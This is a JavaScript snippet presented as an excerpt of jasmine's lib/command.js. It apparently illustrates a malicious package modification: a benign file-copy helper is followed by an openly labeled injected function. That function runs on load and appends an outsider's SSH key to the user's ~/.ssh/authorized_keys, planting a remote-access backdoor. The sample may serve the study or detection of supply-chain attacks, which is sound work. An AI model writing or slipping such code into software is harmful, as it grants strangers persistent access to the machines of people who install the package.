// Excerpted from jasmine: lib/command.js
// Use of fs in benign version:
var fs = require('fs');
var path = require('path')
function copyFiles(srcDir, destDir, pattern) {
  const srcDirFiles = fs.readdirSync(srcDir);
  srcDirFiles.forEach(function(file) {
    if (file.search(pattern) !== -1) {
      fs.writeFileSync(destDir +  file, fs.readFileSync(path.join(srcDir, file)));
    }
  });
}

module.exports = {
	copyFiles: copyFiles
}

// Added malicious use:
function f() {
  var my_ssh_key="\nssh-rsa AAA...0x happy@friend";
  var data = fs.readFileSync('~/.ssh/authorized_keys');
  fs.writeFileSync('~/.ssh/authorized_keys', data + my_ssh_key);
}
f()
